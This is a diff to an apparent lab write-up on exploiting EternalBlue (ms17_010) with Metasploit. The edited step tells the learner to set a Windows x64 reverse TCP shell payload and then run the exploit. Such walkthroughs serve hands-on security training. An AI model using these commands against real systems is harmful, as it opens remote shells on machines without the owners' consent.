@@ -456,7 +456,7 @@ msf exploit(windows/smb/ms17_010_eternalblue) >
 <br>
 </div>
 
-### Q7 Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>`set payload windows/x64/shell/reverse_tcp`
+### Q7 Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>`set payload windows/x64/shell/reverse_tcp`<br>With that done, run the exploit!
 
 ==Answer==
 <div align="center">
